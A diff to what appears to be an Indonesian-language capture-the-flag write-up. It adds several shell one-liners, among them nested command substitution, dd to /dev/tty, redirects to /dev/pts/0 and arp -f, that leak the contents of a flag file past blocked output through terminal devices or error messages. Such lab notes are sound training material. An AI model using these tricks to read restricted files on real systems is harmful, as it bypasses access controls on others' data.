@@ -73,6 +73,10 @@ eval cat /home/level1/flag.txt 1>&2				: subtitusi command lalu eval eksekusi ca
 bash -x *.sh									: eksekusi semua file bash, lalu menampilkan debug/trace termasuk file flag
 bash "flag.txt"									: eksekusi file flag.txt menjadi bash, yang otomatis memberikan error command not found, karena flag tidak cocok dengan command
 cat /home/level1/flag.txt 1>&0					: eksekusi cat ke file flag.txt dan output ke stdin
+cat `cat flag.txt`								: nested subtitusi cat flag.txt, lalu cat isi file.txt yang otomatis menampilkan pesan error file not found dari FLAG-xxxx nya
+dd if=/home/level1/flag.txt of=/dev/tty			: eksekusi dd dengan file input flag.txt yang akan muncul di output file terminal kita alias /dev/tty
+cat /home/level1/flag.txt > /dev/pts/0			: pertama mencari tty terminal kita dari 0 s/d ..., atau command tty, jika dapat maka jadikan redirect ke tty tersebut
+arp -f -v /home/level1/flag.txt					: meminta tools arp untuk eksekusinya sehingga muncul error pada syntaxnya 
 ```
 <h3>Flag</h3>
 <pre>
